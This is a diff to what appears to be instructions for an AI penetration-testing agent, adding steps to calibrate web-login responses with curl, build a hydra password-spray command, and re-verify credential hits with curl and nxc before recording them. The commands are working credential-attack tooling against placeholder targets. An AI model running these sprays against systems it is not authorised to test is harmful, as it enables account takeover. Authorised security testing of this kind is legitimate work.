@@ -286,6 +286,33 @@ SecLists file is appended.**
 2. `engagement/evidence/wordlist.txt`
 3. Operator-provided wordlist path
 
+## HTTP Form Calibration (Web Login Only)
+
+Before spraying a web login form, calibrate success/failure detection:
+
+1. **Register a test account** (or use one the orchestrator provides)
+2. **Establish baseline responses** — login with known-valid and known-bad creds:
+   ```bash
+   # Known-bad baseline
+   curl -s -o /dev/null -w '%{http_code} %{size_download}' \
+     -X POST http://TARGET/login -d 'user=INVALID&pass=INVALID'
+   # Known-good baseline
+   curl -s -o /dev/null -w '%{http_code} %{size_download}' \
+     -X POST http://TARGET/login -d 'user=TESTUSER&pass=TESTPASS'
+   ```
+3. **Identify the success indicator** — status code diff, body size diff,
+   redirect URL, Set-Cookie header, or specific string in response body
+4. **Build the hydra form string** from observed behavior:
+   ```bash
+   # F= string must match FAILURE response, not success
+   hydra -L users.txt -P pass.txt TARGET http-post-form \
+     "/login:user=^USER^&pass=^PASS^:F=<failure-indicator>" -u -t 4
+   ```
+
+**If you cannot establish a reliable success/failure indicator, report the
+limitation and return.** Do not spray with unreliable detection — it produces
+false positives that waste downstream agent time.
+
 ## Spray Execution — Script-Based
 
 **Generate a self-contained spray script, then execute it in one shot.**
@@ -625,6 +652,24 @@ nxc smb 10.10.10.0/24 -u 'Administrator' \
 ```
 
 ## Step 3: Validate and Exploit Hits
+
+### Credential Verification (Mandatory Before State Writes)
+
+**Every hit must be double-verified before calling `add_credential()`.** Spray
+tools produce false positives from redirect chains, WAF interference, and
+inconsistent response parsing. Re-test each hit individually:
+
+```bash
+# Re-test with curl (HTTP login) — compare response to known-bad baseline
+curl -s -o /dev/null -w '%{http_code} %{size_download} %{redirect_url}' \
+  -X POST http://TARGET/login -d 'user=HITUSER&pass=HITPASS'
+
+# Re-test with nxc (AD/SSH/SMB) — single credential, verbose
+nxc SERVICE TARGET -u 'HITUSER' -p 'HITPASS' -d DOMAIN 2>&1
+```
+
+Only call `add_credential()` when the re-test confirms access. If re-test
+fails, discard the hit and note it as a false positive in your return summary.
 
 ### Verify Access Level
 
